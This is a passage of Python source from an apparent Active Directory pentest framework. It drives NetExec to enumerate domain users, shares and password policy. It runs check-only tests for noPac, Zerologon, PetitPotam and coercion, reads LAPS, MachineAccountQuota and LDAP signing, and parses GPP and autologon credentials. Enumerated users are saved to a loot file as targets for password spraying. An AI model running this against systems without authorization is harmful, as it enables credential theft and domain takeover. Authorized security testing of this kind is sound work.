"""Phase 1b - Authenticated reconnaissance (NetExec + Certipy).

Runs only once at least one domain credential is available - either a
grey-box account supplied up front, or a credential the operator injects
after the anonymous recon (black box). It enriches the engagement state
with information anonymous Phase 1 cannot reach:

* ``nxc smb`` domain enumeration - users, groups, shares, password policy.
* ``nxc smb`` vulnerability *detection* (check-only): nopac, zerologon,
  coerce_plus, spooler. No exploitation happens here; positive checks are
  recorded as findings and exploited later (Phase 4/5).
* ``nxc ldap`` recon - MachineAccountQuota, LAPS readability, ADCS PKI
  services, LDAP signing / LDAPS channel-binding (EPA) relay protections.
* ``certipy find`` - ADCS certificate-template misconfigurations (ESC1-8).

Every sub-step is best-effort and independent: a missing tool, a timeout
or a failed call is logged and the next step still runs. Because this is
*reconnaissance* (detection only), it is allowed to run even in safe mode.
"""

from __future__ import annotations

import base64
import io
import re
import shutil
import subprocess
import threading
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from pathlib import Path

try:
    from impacket.smbconnection import SMBConnection as _SMBConnection  # type: ignore
    _HAS_IMPACKET_SMB = True
except Exception:
    _HAS_IMPACKET_SMB = False

try:
    from Crypto.Cipher import AES as _AES  # type: ignore (pycryptodome)
    _HAS_CRYPTO = True
except Exception:
    _HAS_CRYPTO = False

from core.logger import get_logger
from core.target_manager import (
    CertificateAuthority,
    Credential,
    Finding,
    TargetManager,
)
from modules.exploitation.certipy import CertipyRunner

_NXC_CANDIDATES = ("nxc", "netexec", "crackmapexec")

# Phase label stamped on every SOC activity emitted by authenticated recon.
_PHASE_1B = "Phase 1b - Authenticated reconnaissance"

# Vulnerability-detection modules. Each tuple drives one ``nxc <proto> -M
# <module>`` check-only run and the finding emitted when it reports a
# positive result.
#   (proto, module, finding_prefix, title, severity, description, remediation)
# [MODIF] – Advanced audit modules: AV detection, coercion, GPP abuse, delegation.
# Format: (module, finding_prefix, title, severity, description, remediation, targets)
#   targets: "dc" = DCs only, "all" = every host with port 445.
_ADVANCED_NXC_MODULES: list[tuple[str, str, str, str, str, str, str]] = [
    (
        "enum_av",
        "ENUM-AV",
        "AV/EDR product detected",
        "info",
        "An antivirus or endpoint detection product was identified on the host. "
        "Document the product for the engagement report.",
        "No remediation needed; review the security posture of the detected product.",
        "all",
    ),
    (
        "petitpotam",
        "PETITPOTAM",
        "PetitPotam — LSARPC coercion possible (CVE-2021-36942)",
        "high",
        "The host accepts unauthenticated EfsRpcOpenFileRaw calls (MS-EFSR), "
        "forcing it to authenticate to an attacker. Combined with ntlmrelayx "
        "this enables NTLM relay and potential domain takeover.",
        "Apply KB5005413 (August 2021). Disable the Encrypting File System "
        "service if unused. Enforce Extended Protection for Authentication on LDAP.",
        "dc",
    ),
    (
        "gpp_password",
        "GPP-PASSWORD",
        "GPP password found in SYSVOL (MS14-025)",
        "high",
        "Group Policy Preferences containing encrypted passwords (cpassword) "
        "were found in SYSVOL. The AES-256 key is publicly documented (MS14-025), "
        "making recovery trivial for any domain user.",
        "Remove all GPP cpassword entries. Apply KB2962486 (MS14-025). "
        "Rotate every affected account password immediately.",
        "all",
    ),
    (
        "gpp_autologin",
        "GPP-AUTOLOGIN",
        "GPP autologon credentials found",
        "high",
        "AutoLogon credentials were found in Group Policy Preferences. "
        "These are stored in plaintext and grant access to the configured account.",
        "Remove autologon GPP entries. Rotate affected credentials. "
        "Consider LAPS for local admin account management.",
        "all",
    ),
    (
        "badsuccessor",
        "BADSUCCESSOR",
        "BadSuccessor — delegated OU admin can escalate to Domain Admin",
        "critical",
        "The domain is vulnerable to BadSuccessor: an account with delegated "
        "OU control can create AdminSDHolder-protected child objects and escalate "
        "to Domain Admin via Kerberos delegation abuse.",
        "Audit and restrict OU delegation rights. Apply available vendor patches. "
        "Enable Protected Users group for all privileged accounts.",
        "dc",
    ),
]

_SMB_VULN_CHECKS = [
    (
        "nopac",
        "NOPAC",
        "noPac (CVE-2021-42278/42287)",
        "critical",
        "The domain controller is vulnerable to noPac: a standard domain "
        "user can impersonate a Domain Admin by abusing sAMAccountName "
        "spoofing combined with S4U2self.",
        "Apply the November 2021 patches (KB5008380/KB5008602) and set the "
        "MachineAccountQuota to 0.",
    ),
    (
        "zerologon",
        "ZEROLOGON",
        "Zerologon (CVE-2020-1472)",
        "critical",
        "The domain controller is vulnerable to Zerologon: the Netlogon "
        "secure channel can be reset to a null session, allowing a full "
        "domain takeover.",
        "Apply the August 2020 patches and enforce secure RPC for Netlogon "
        "(FullSecureChannelProtection).",
    ),
    (
        "coerce_plus",
        "COERCE",
        "Authentication coercion exposed",
        "high",
        "The host exposes one or more RPC methods (MS-EFSR, MS-RPRN, "
        "MS-DFSNM, MS-FSRVP) that can coerce it into authenticating to an "
        "attacker, enabling NTLM relay.",
        "Disable or restrict the affected services and enforce SMB/LDAP "
        "signing plus Extended Protection for Authentication.",
    ),
    (
        "spooler",
        "SPOOLER",
        "Print Spooler service enabled",
        "medium",
        "The Print Spooler service is running and can be abused (PrinterBug "
        "/ MS-RPRN) to coerce the host into authenticating to an attacker.",
        "Disable the Print Spooler service on servers that do not need it, "
        "especially Domain Controllers.",
    ),
]


@dataclass
class AuthedReconResult:
    status: str = "completed"                       # completed / skipped / error
    users_found: int = 0
    shares_found: int = 0
    vulns: list[str] = field(default_factory=list)
    adcs_templates: list[dict] = field(default_factory=list)
    machine_account_quota: int | None = None
    laps_readable: bool = False
    raw_outputs: dict[str, str] = field(default_factory=dict)


class AuthedRecon:
    """Authenticated reconnaissance driver (Phase 1b)."""

    # Per-nxc-call timeout. The login probe in run() uses min(timeout, 45) so a
    # bad credential / unreachable DC fails fast; override via
    # recon.authed_recon.timeout for slow (e.g. remote) targets.
    DEFAULT_TIMEOUT = 120

    # How often (seconds) to print a "still running" heartbeat during a long
    # call so streaming enumeration (e.g. --users) does not look frozen.
    _HEARTBEAT_SECONDS = 15

    def __init__(
        self,
        tm: TargetManager,
        credential: Credential,
        domain: str,
        dc_ip: str,
        loot_dir: str | Path = "./loot",
        nxc_binary: str | None = None,
        timeout: int = DEFAULT_TIMEOUT,
        run_certipy: bool = True,
    ):
        self.tm = tm
        self.cred = credential
        self.domain = domain
        self.dc_ip = dc_ip
        self.loot_dir = Path(loot_dir)
        self.timeout = timeout
        self.run_certipy = run_certipy
        self.log = get_logger()
        self.nxc_bin = nxc_binary or self._resolve_nxc()
        # Last nxc argv (set by _nxc_capture) so a finding can record the
        # command that produced it.
        self._last_nxc_command = ""

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _resolve_nxc() -> str | None:
        for cand in _NXC_CANDIDATES:
            path = shutil.which(cand)
            if path:
                return path
        return None

    def _auth_args(self) -> list[str]:
        """Build the ``-u/-d/-p|-H`` arguments for an nxc invocation."""
        args = ["-u", self.cred.username]
        if self.domain:
            args += ["-d", self.domain]
        if self.cred.password:
            args += ["-p", self.cred.password]
        elif self.cred.real_nt_hash:
            # nxc -H accepts "LM:NT" or a bare NT hash. Guard on
            # ``real_nt_hash`` so a stashed roast blob never reaches ``-H``.
            args += ["-H", self.cred.real_nt_hash]
        return args

    def _auth_args_display(self) -> str:
        """Human-readable auth args for log lines."""
        parts = [f"-u '{self.cred.username}'"]
        if self.domain:
            parts.append(f"-d {self.domain}")
        if self.cred.password:
            parts.append(f"-p '{self.cred.password}'")
        elif self.cred.real_nt_hash:
            parts.append(f"-H '{self.cred.real_nt_hash}'")
        return " ".join(parts)

    def _nxc(self, proto: str, targets: list[str], extra: list[str]) -> str:
        """Run one nxc invocation and return combined stdout+stderr.

        Returns an empty string when nxc is unavailable or the call fails;
        callers treat an empty result as "nothing to parse".
        """
        out, _ok = self._nxc_capture(proto, targets, extra, self.timeout)
        return out

    def _nxc_capture(
        self, proto: str, targets: list[str], extra: list[str], timeout: int,
    ) -> tuple[str, bool]:
        """Run one nxc invocation. Returns ``(output, ok)``.

        ``ok`` is ``False`` only when nxc could not be run or timed out (so the
        caller can tell an unreachable/slow host apart from one that simply
        answered "access denied"). The secret is never written to the log line;
        only the subprocess receives it.
        """
        if not self.nxc_bin:
            return "", False
        targets = [t for t in targets if t]
        if not targets:
            return "", False
        cmd = [self.nxc_bin, proto, *targets, *self._auth_args(), *extra]
        # Show the -u/-p so a credentialed call is visibly distinct from
        # a null session.
        label = (
            f"nxc {proto} {' '.join(targets)} {self._auth_args_display()} "
            f"{' '.join(extra)}"
        ).strip()
        # Show the timeout so a long call does not look frozen.
        self.log.action(f"{label} (up to {timeout}s)")
        # Remember the exact argv so a finding raised from this call's output can
        # carry the command that produced it (rendered in the report).
        self._last_nxc_command = " ".join(cmd)
        self.tm.record_command(
            cmd, phase=_PHASE_1B, tool="netexec", target=", ".join(targets),
        )

        # Run in a worker thread so the main thread can print a heartbeat: some
        # calls (notably --users on a large domain over a slow link) stream for
        # a long time, and a silent capture looks like a hang.
        box: dict = {}

        def _worker() -> None:
            try:
                proc = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    text=True,
                    timeout=timeout,
                )
                box["out"] = (proc.stdout or "") + "\n" + (proc.stderr or "")
                box["ok"] = True
            except subprocess.TimeoutExpired:
                box["timeout"] = True
            except Exception as exc:  # noqa: BLE001 - best effort, never fatal
                box["err"] = str(exc)

        thread = threading.Thread(target=_worker, daemon=True)
        thread.start()
        elapsed = 0
        while thread.is_alive():
            thread.join(timeout=self._HEARTBEAT_SECONDS)
            if not thread.is_alive():
                break
            elapsed += self._HEARTBEAT_SECONDS
            self.log.info(f"    {label}: still running ({elapsed}s/{timeout}s)...")

        if box.get("timeout"):
            self.log.warn(
                f"{label} timed out after {timeout}s - raise "
                "recon.authed_recon.timeout for slow/remote targets"
            )
            return "", False
        if "err" in box:
            self.log.warn(f"nxc {proto} failed: {box['err']}")
            return "", False
        return box.get("out", ""), box.get("ok", False)

    def _validate_login(self) -> tuple[bool, str]:
        """Fast auth + reachability probe before the full enumeration.

        A single ``nxc smb <dc>`` login with a short timeout, so a rejected
        credential or an unreachable/very slow DC aborts Phase 1b in seconds
        instead of grinding through ~10 long-running checks.
        """
        if not self.dc_ip:
            return True, "no DC to validate against (continuing)"
        probe_timeout = min(self.timeout, 45)
        out, ok = self._nxc_capture("smb", [self.dc_ip], [], probe_timeout)
        if not ok:
            return False, (
                f"DC {self.dc_ip} did not answer the login within "
                f"{probe_timeout}s (unreachable or too slow)"
            )
        if "STATUS_LOGON_FAILURE" in out or "STATUS_ACCESS_DENIED" in out:
            return False, "credential rejected by the DC (logon failure)"
        if "[-]" in out and "[+]" not in out:
            return False, "login was not accepted by the DC"
        return True, "credential accepted"

    # ------------------------------------------------------------------
    # Parsers (best effort, resilient to nxc formatting changes)
    # ------------------------------------------------------------------

    @staticmethod
    def _is_user_name(name: str) -> bool:
        """True for a plausible sAMAccountName (not a machine account)."""
        return bool(
            name
            and not name.endswith("$")
            and "@" not in name
            and re.fullmatch(r"[A-Za-z0-9._-]+", name)
        )

    @classmethod
    def _parse_users(cls, output: str) -> set[str]:
        """Extract user names from ``nxc smb --users`` output.

        Handles the column table nxc actually emits::

            SMB  ip  445  HOST  -Username-      -Last PW Set-  -BadPW- -Description-
            SMB  ip  445  HOST  Administrator   2026-...       0       Built-in ...
            SMB  ip  445  HOST  [*] Enumerated 11 local users: ESSOS

        The 5th whitespace-delimited column is the username. A fallback also
        scans for ``domain\\user`` tokens to stay robust across other nxc
        commands. Machine accounts (trailing ``$``) are excluded.
        """
        users: set[str] = set()
        in_table = False
        for line in output.splitlines():
            if "-Username-" in line:
                in_table = True
                continue
            if in_table:
                # The table ends at any status marker / the "Enumerated" footer.
                if any(m in line for m in ("[*]", "[+]", "[-]", "[!]")) or \
                        "enumerated" in line.lower():
                    in_table = False
                    continue
                parts = line.split()
                if len(parts) >= 5 and parts[0].upper() in ("SMB", "LDAP"):
                    if cls._is_user_name(parts[4]):
                        users.add(parts[4].lower())
        # Fallback: domain\user tokens (e.g. RID-brute style output). Tokens
        # carrying a ':' are auth lines (user:password) and are ignored.
        for raw in output.splitlines():
            for token in raw.split():
                if "\\" in token and ":" not in token:
                    name = token.split("\\", 1)[1].strip()
                    if cls._is_user_name(name):
                        users.add(name.lower())
        return users

    @staticmethod
    def _parse_shares(output: str) -> list[dict]:
        """Extract share rows from ``nxc smb --shares`` output."""
        shares: list[dict] = []
        seen: set[str] = set()
        for raw in output.splitlines():
            low = raw.lower()
            if "read" not in low and "write" not in low:
                continue
            # Typical row:
            #   SMB host 445 HOST  ShareName   READ,WRITE   Remark text
            m = re.search(
                r"\b(?P<name>[\w$.\- ]+?)\s+(?P<perm>READ(?:,WRITE)?|WRITE)\b"
                r"(?P<remark>.*)$",
                raw,
            )
            if not m:
                continue
            name = m.group("name").split()[-1].strip()
            if not name or name in seen:
                continue
            seen.add(name)
            shares.append(
                {
                    "name": name,
                    "access": m.group("perm"),
                    "remark": m.group("remark").strip(),
                }
            )
        return shares

    @staticmethod
    def _parse_pass_policy(output: str) -> dict:
        """Pull the key fields of ``nxc smb --pass-pol`` output."""
        pol: dict = {}
        patterns = {
            "min_length": r"Minimum password length\s*:\s*(\d+)",
            "lockout_threshold": r"Account Lockout Threshold\s*:\s*(\d+|None)",
            "lockout_window": r"(?:Reset Account Lockout Counter|Locked Account Duration)\s*:\s*(.+)",
            "password_history": r"Password history length\s*:\s*(\d+)",
        }
        for key, pat in patterns.items():
            m = re.search(pat, output, re.IGNORECASE)
            if m:
                pol[key] = m.group(1).strip()
        return pol

    @staticmethod
    def _parse_maq(output: str) -> int | None:
        m = re.search(r"MachineAccountQuota\s*[:=]\s*(\d+)", output, re.IGNORECASE)
        return int(m.group(1)) if m else None

    # [MODIF] – parsers for GPP credential extraction from nxc module output.

    @staticmethod
    def _parse_gpp_credentials(output: str) -> list[dict]:
        """Extract credentials from ``nxc smb -M gpp_password`` output.

        nxc gpp_password emits blocks like::

            SMB  host  445  DC  [+] Found credentials in GPP
            SMB  host  445  DC  Username: svc_backup
            SMB  host  445  DC  Password: Backup2024!
            SMB  host  445  DC  Domain:   ROOTME
            SMB  host  445  DC  Changed:  2024-01-15
            SMB  host  445  DC  GPO:      Default Domain Policy

        Returns a list of dicts with keys: username, password, domain, gpo, changed.
        """
        creds: list[dict] = []
        current: dict = {}

        def _extract_value(content: str) -> str:
            """Return the part after the last ':' in a content string."""
            return content.split(":", 1)[1].strip() if ":" in content else content.strip()

        for line in output.splitlines():
            # Strip leading protocol/host prefix (e.g. "SMB  ip  445  HOST  ")
            m = re.match(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)", line)
            content = m.group(1).strip() if m else line.strip()
            low = content.lower()

            # nxc formats: "Username: x", "[!] Found Username: x", "[+] Found Username: x"
            # Extract the keyword from anywhere in the line.
            if re.search(r"\bpassword\b.*:", low) and not re.search(r"found\s+sysvol|found\s+share|searching", low):
                current.setdefault("password", _extract_value(content))
            elif re.search(r"\busername\b.*:", low) or re.search(r"\blogin\b.*:", low):
                current.setdefault("username", _extract_value(content))
            elif re.search(r"\bdomain\b.*:", low) and "domain:" in low:
                current.setdefault("domain", _extract_value(content))
            elif re.search(r"\bgpo\b.*:|policy.*:", low):
                current.setdefault("gpo", _extract_value(content))
            elif re.search(r"\bchanged\b.*:|newname.*:", low):
                current.setdefault("changed", _extract_value(content))

        if current.get("username") or current.get("password"):
            creds.append(current)
        return creds

    @staticmethod
    def _parse_gpp_autologin(output: str) -> list[dict]:
        """Extract credentials from ``nxc smb -M gpp_autologin`` output.

        nxc gpp_autologin emits lines like::

            SMB  host  445  DC  [+] Found autologin credentials
            SMB  host  445  DC  DefaultDomainName: ROOTME
            SMB  host  445  DC  DefaultUserName:   Administrator
            SMB  host  445  DC  DefaultPassword:   Admin123!

        Returns a list of dicts with keys: username, password, domain.
        """
        creds: list[dict] = []
        current: dict = {}
        for line in output.splitlines():
            m = re.match(r"^\s*\w+\s+\S+\s+\d+\s+\S+\s+(.*)", line)
            content = m.group(1).strip() if m else line.strip()
            low = content.lower()

            if re.search(r"\[\+\].*autologin", low) or re.search(r"\[\+\].*found", low):
                if current.get("username") or current.get("password"):
                    creds.append(current)
                current = {}
            elif "defaultusername" in low or "username" in low:
                current["username"] = content.split(":", 1)[1].strip() if ":" in content else ""
            elif "defaultpassword" in low or "password" in low:
                current["password"] = content.split(":", 1)[1].strip() if ":" in content else ""
            elif "defaultdomainname" in low or "domain" in low:
                current["domain"] = content.split(":", 1)[1].strip() if ":" in content else ""

        if current.get("username") or current.get("password"):
            creds.append(current)
        return creds

    @staticmethod
    def _module_is_positive(module: str, output: str) -> bool:
        low = output.lower()
        if module == "spooler":
            if "spooler service enabled" in low:
                return True
            return "spooler" in low and "enabled" in low and "disabled" not in low
        # [MODIF] – handlers for advanced audit modules.
        if module == "enum_av":
            # [+] lines from nxc enum_av indicate a detected product.
            return bool(re.search(r"\[\+\]", output))
        if module == "gpp_password":
            # Require actual credential content — NOT just SYSVOL access.
            # "Found SYSVOL share" / "Searching for XML" are informational only.
            return bool(
                re.search(r"found\s+username", low)
                or re.search(r"found\s+password", low)
                or re.search(r"decrypted\s+password", low)
                or "cpassword" in low
                or re.search(r"\[\+\].*username", low)
                or re.search(r"\[\!\].*found\s+\w+name", low)
            )
        if module == "gpp_autologin":
            # Require actual DefaultPassword content — NOT just SYSVOL access.
            return bool(
                "defaultpassword" in low
                or re.search(r"\[\+\].*autologin.*credential", low)
                or re.search(r"\[\!\].*defaultpassword", low)
            )
        if "not vulnerable" in low:
            return False
        return "vulnerable" in low

    @staticmethod
    def _parse_av_products(output: str) -> list[str]:
        """Extract detected AV/EDR product names from ``nxc -M enum_av`` output.

        nxc enum_av emits lines like::

            SMB  ip  445  HOST  [+] Windows Defender Antivirus - enabled
            SMB  ip  445  HOST  [+] CrowdStrike Falcon Sensor

        Returns a deduplicated list of product name strings.
        """
        products: list[str] = []
        seen: set[str] = set()
        for line in output.splitlines():
            m = re.search(r"\[\+\]\s+(.+)", line)
            if not m:
                continue
            product = m.group(1).strip()
            # Skip the nxc auth-success line ``[+] domain\\user:secret`` (and
            # ``(Pwn3d!)`` variants): it is NOT an AV product, and parsing it
            # both produces a bogus finding and leaks the credential into the
            # report. Real product names never contain a domain\\user backslash.
            if "\\" in product or "(Pwn3d!)" in product:
                continue
            # Skip generic infrastructure lines (share listings, auth lines...).
            if any(skip in product.lower() for skip in (
                "rootme", "pentest", "windows 10", "server 20", "smb",
                "enumerated", "logon server", "remote",
            )):
                continue
            if product not in seen:
                seen.add(product)
                products.append(product)
        return products

    # ------------------------------------------------------------------
    # Sub-steps
    # ------------------------------------------------------------------

    # [MODIF] – persist enumerated users to a deduplicated loot file instead of
    # dumping the whole list to the console.
    def _persist_users(self, users: set[str]) -> tuple[Path | None, int]:
        """Merge ``users`` into ``loot/domain_users.txt`` (deduped, sorted).

        Existing entries from previous runs are preserved and merged
        case-insensitively, so the file stays a stable, duplicate-free target
        list for spraying / AS-REP roasting. Returns ``(path, total_unique)``,
        or ``(None, count)`` if the file cannot be written.
        """
        merged = {u.strip().lower() for u in users if u.strip()}
        users_file = self.loot_dir / "domain_users.txt"
        try:
            if users_file.exists():
                for line in users_file.read_text(encoding="utf-8").splitlines():
                    name = line.strip().lower()
                    if name:
                        merged.add(name)
            self.loot_dir.mkdir(parents=True, exist_ok=True)
            users_file.write_text(
                "\n".join(sorted(merged)) + "\n", encoding="utf-8"
            )
        except OSError as exc:
            self.log.warn(f"Could not persist domain users: {exc}")
            return None, len(merged)
        return users_file, len(merged)

    def _domain_enum(self, result: AuthedReconResult) -> None:
        """nxc smb domain enumeration: users, password policy, shares."""
        # [MODIF] – use three-tier fallback: null-session --users, null-session
        # --rid-brute, then credentialed --users. The method that succeeds is
        # recorded as a finding so the operator knows the exposure level.
        self.tm.record_activity(
            "ldap-enum", self.dc_ip, phase=_PHASE_1B, port=445, protocol="smb",
            tool="netexec",
            details="authenticated nxc smb --users / --rid-brute enumeration",
        )
        users, method, raw_out = self._enum_users_with_fallback(self.dc_ip)
        # Store the actual nxc output in loot (prefixed with the method used).
        result.raw_outputs["smb_users"] = f"[method: {method}]\n{raw_out}"
        if users:
            for u in users:
                self.tm.add_user(u)
            result.users_found = len(users)
            self.log.success(
                f"authed-recon: {len(users)} domain user(s) enumerated via {method}"
            )
            # [MODIF] – store the deduplicated list in loot instead of printing
            # every name; show only a short preview + the file path.
            users_file, total = self._persist_users(users)
            preview = ", ".join(sorted(users)[:10])
            if len(users) > 10:
                preview += f" ... (+{len(users) - 10} more)"
            self.log.info(f"  Sample: {preview}")
            if users_file is not None:
                self.log.info(f"  Full list ({total} unique) saved to {users_file}")
            # auth_context depends on which method actually worked.
            _user_enum_ctx = (
                "anonymous" if "null session" in method else "authenticated"
            )
            self.tm.add_finding(Finding(
                id=f"USER-ENUM-{self.dc_ip}",
                title=f"Domain users enumerable via {method}",
                severity="medium",
                host=self.dc_ip,
                description=(
                    f"Domain user accounts ({len(users)}) were retrieved using "
                    f"'{method}'. This level of exposure allows an attacker to "
                    "build a target list for password spraying and AS-REP roasting."
                ),
                remediation=(
                    "Restrict anonymous SAMR access (RestrictAnonymousSAM=1). "
                    "Review LDAP anonymous bind settings."
                ),
                auth_context=_user_enum_ctx,
                command=(
                    f"nxc smb {self.dc_ip} -u '' -p '' --users"
                    if "null session" in method
                    else f"nxc smb {self.dc_ip} {self._auth_args_display()} --users"
                ),
            ))
        else:
            # [MODIF] – no_result when all user enum strategies fail.
            self.log.no_result(
                f"{self.dc_ip}: user enumeration — no users returned by any method"
            )

        # Password policy (separate call; different output shape).
        self.tm.record_activity(
            "password-policy", self.dc_ip, phase=_PHASE_1B,
            details="nxc smb --pass-pol (lockout threshold discovery)",
        )
        pol_out = self._nxc("smb", [self.dc_ip], ["--pass-pol"])
        result.raw_outputs["smb_pass_pol"] = pol_out
        if pol_out:
            policy = self._parse_pass_policy(pol_out)
            if policy:
                self._record_password_policy(policy)

        # Shares across every alive host.
        all_ips = [h.ip for h in self.tm.alive_hosts()]
        self.tm.record_activity(
            "smb-null-session", phase=_PHASE_1B, targets=", ".join(all_ips),
            tool="netexec", port=445, protocol="smb",
            details="authenticated nxc smb --shares enumeration across the scope",
        )
        share_out = self._nxc("smb", all_ips, ["--shares"])
        result.raw_outputs["smb_shares"] = share_out
        if share_out:
            shares = self._parse_shares(share_out)
            result.shares_found = len(shares)
            if shares:
                # Attach to the DC host as a coarse approximation; the raw
                # output (kept in loot) preserves the per-host breakdown.
                dc_host = self.tm.get_host(self.dc_ip)
                if dc_host is not None and not dc_host.shares:
                    dc_host.shares = shares
                self.log.success(
                    f"authed-recon: {len(shares)} readable/writable share(s)"
                )

    def _record_password_policy(self, policy: dict) -> None:
        if self.domain:
            self.tm.add_domain(self.domain, password_policy=policy)
        threshold = policy.get("lockout_threshold")
        # A lockout threshold of 0/None means accounts never lock - spraying
        # is unconstrained, which is itself worth reporting.
        if threshold in ("0", "None", "none", None):
            self.tm.add_finding(
                Finding(
                    id=f"PASS-POL-{self.domain or 'domain'}",
                    title="Account lockout disabled",
                    severity="medium",
                    host=self.dc_ip,
                    description=(
                        "The domain password policy does not lock accounts "
                        f"after failed logons (threshold: {threshold}). "
                        "Password spraying can run without triggering "
                        "lockouts."
                    ),
                    remediation=(
                        "Configure an account lockout threshold (e.g. 5 "
                        "attempts) with an appropriate reset window."
                    ),
                    auth_context="authenticated",
                )
            )

    def _vuln_checks(self, result: AuthedReconResult) -> None:
        """Detection-only nxc -M checks against DCs / Windows hosts only.

        Limiting to hosts with port 445 open avoids false positives on
        non-Windows devices (VirtualBox gateway, Linux VMs, …) that happen
        to respond to ARP/ICMP but have no SMB service.
        """
        dc_ips = [h.ip for h in self.tm.dcs()] or [self.dc_ip]
        all_ips = [
            h.ip for h in self.tm.alive_hosts() if h.has_port(445)
        ]

        for module, prefix, title, severity, desc, remediation in _SMB_VULN_CHECKS:
            # nopac/zerologon are DC-specific; coerce_plus/spooler apply to
            # any Windows host.
            targets = dc_ips if module in ("nopac", "zerologon") else all_ips
            for tgt in targets:
                self.tm.record_activity(
                    "vuln-scan", tgt, phase=_PHASE_1B, port=445, protocol="smb",
                    details=f"detection-only nxc -M {module} check",
                )
            out = self._nxc("smb", targets, ["-M", module])
            result.raw_outputs[f"vuln_{module}"] = out
            if not out:
                # [MODIF] – explicit notice when nxc returns no output for this module.
                self.log.no_result(f"{module}: no output — tool may be absent or target unreachable")
                continue
            # Emit one finding per affected host that the module flags.
            vuln_found = False
            for host_ip in targets:
                host_lines = "\n".join(
                    ln for ln in out.splitlines() if host_ip in ln
                )
                if host_lines and self._module_is_positive(module, host_lines):
                    vuln_found = True
                    result.vulns.append(f"{module}@{host_ip}")
                    self.tm.add_finding(
                        Finding(
                            id=f"{prefix}-{host_ip}",
                            title=title,
                            severity=severity,
                            host=host_ip,
                            description=desc,
                            remediation=remediation,
                            evidence=host_lines.strip()[:500],
                            auth_context="authenticated",
                            command=self._last_nxc_command,
                        )
                    )
                    self.log.finding(f"{host_ip}: {title}")
            # [MODIF] – log "resistant" when no target was flagged by the module.
            if not vuln_found:
                self.log.no_result(
                    f"{module}: no vulnerability detected — system appears resistant"
                )

    def _ldap_recon(self, result: AuthedReconResult) -> None:
        """nxc ldap recon: MachineAccountQuota, LAPS, ADCS services."""
        if not self.dc_ip:
            return

        self.tm.record_activity(
            "machine-account-quota", self.dc_ip, phase=_PHASE_1B,
            details="nxc ldap -M maq (ms-DS-MachineAccountQuota read)",
        )
        maq_out = self._nxc("ldap", [self.dc_ip], ["-M", "maq"])
        result.raw_outputs["ldap_maq"] = maq_out
        maq = self._parse_maq(maq_out)
        if maq is not None:
            result.machine_account_quota = maq
            self.log.info(f"authed-recon: MachineAccountQuota = {maq}")
            if maq > 0:
                self.tm.add_finding(
                    Finding(
                        id=f"MAQ-{self.domain or 'domain'}",
                        title=f"MachineAccountQuota = {maq}",
                        severity="low",
                        host=self.dc_ip,
                        description=(
                            "Any authenticated user can create up to "
                            f"{maq} machine account(s). This enables RBCD "
                            "and noPac-style attacks."
                        ),
                        remediation=(
                            "Set ms-DS-MachineAccountQuota to 0 and delegate "
                            "machine joins to a dedicated group."
                        ),
                        auth_context="authenticated",
                        command=self._last_nxc_command,
                    )
                )

        self.tm.record_activity(
            "laps-read", self.dc_ip, phase=_PHASE_1B,
            details="nxc ldap -M laps (LAPS admin password read attempt)",
        )
        laps_out = self._nxc("ldap", [self.dc_ip], ["-M", "laps"])
        result.raw_outputs["ldap_laps"] = laps_out
        # nxc prints the recovered password(s) when the account can read LAPS.
        if laps_out and re.search(r"(ms-?mcs-?admpwd|laps).*:.*\S", laps_out, re.IGNORECASE):
            if "password" in laps_out.lower() or "admpwd" in laps_out.lower():
                result.laps_readable = True
                self.tm.add_finding(
                    Finding(
                        id=f"LAPS-READ-{self.cred.username}",
                        title="LAPS passwords readable",
                        severity="high",
                        host=self.dc_ip,
                        description=(
                            f"The account '{self.cred.username}' can read LAPS "
                            "local-administrator passwords, granting local "
                            "admin on the corresponding hosts."
                        ),
                        remediation=(
                            "Restrict ms-Mcs-AdmPwd read rights to authorized "
                            "administrators only."
                        ),
                        auth_context="authenticated",
                        command=self._last_nxc_command,
                    )
                )
                self.log.finding("LAPS passwords readable with current account")

        self.tm.record_activity(
            "adcs-enum", self.dc_ip, phase=_PHASE_1B, port=389, protocol="ldap",
            tool="netexec", details="nxc ldap -M adcs (PKI enrollment service discovery)",
        )
        adcs_out = self._nxc("ldap", [self.dc_ip], ["-M", "adcs"])
        result.raw_outputs["ldap_adcs"] = adcs_out
        if adcs_out:
            self._handle_ldap_adcs(adcs_out)

        self._ldap_relay_protections(result)

    def _ldap_relay_protections(self, result: AuthedReconResult) -> None:
        """Check LDAP signing and LDAPS channel binding (EPA) enforcement.

        Runs ``nxc ldap -M ldap-checker`` (a LdapRelayScan port). A DC that
        does not enforce LDAP signing is relayable over plain LDAP (389); one
        that enforces signing but not LDAPS channel binding is still relayable
        over LDAPS (636). Both are prerequisites the operator needs before a
        relay-to-LDAP attack (RBCD / Shadow Credentials), so each raises a
        finding and tags the DC host accordingly.
        """
        self.tm.record_activity(
            "ldap-signing-check", self.dc_ip, phase=_PHASE_1B, port=389, protocol="ldap",
            tool="netexec",
            details="nxc ldap -M ldap-checker (LDAP signing + LDAPS channel binding)",
        )
        out = self._nxc("ldap", [self.dc_ip], ["-M", "ldap-checker"])
        result.raw_outputs["ldap_checker"] = out
        if not out:
            return
        low = out.lower()
        host = self.tm.hosts.get(self.dc_ip)

        # LDAP signing not enforced -> plain-LDAP (389) relay target.
        if re.search(r"signing\s+(is\s+)?not\s+(enforced|required)", low):
            if host and "relay-target-ldap" not in host.tags:
                host.tags.append("relay-target-ldap")
            self.tm.add_finding(
                Finding(
                    id=f"LDAP-SIGNING-{self.dc_ip}",
                    title="LDAP signing not enforced",
                    severity="high",
                    host=self.dc_ip,
                    description=(
                        "The Domain Controller does not enforce LDAP signing, so "
                        "a coerced or poisoned NTLM authentication can be relayed "
                        "to LDAP (389) to write RBCD or Shadow Credentials."
                    ),
                    remediation=(
                        "Enforce LDAP signing (Domain controller: LDAP server "
                        "signing requirements = Require signing) via GPO."
                    ),
                    auth_context="authenticated",
                    command=self._last_nxc_command,
                )
            )
            self.log.finding(f"{self.dc_ip}: LDAP signing NOT enforced -> LDAP relay target")

        # Channel binding not enforced on LDAPS (636) -> LDAPS relay target even
        # when signing is required. The robust signal is the enforcement level
        # nxc reports: 'Channel Binding is set to "Always"' is safe, any other
        # value ("Never" / "When Supported") is vulnerable. Parse the quoted
        # value first (avoids the "Not vulnerable" false positive on the word
        # "vulnerable"); fall back to explicit phrasing when there is no value.
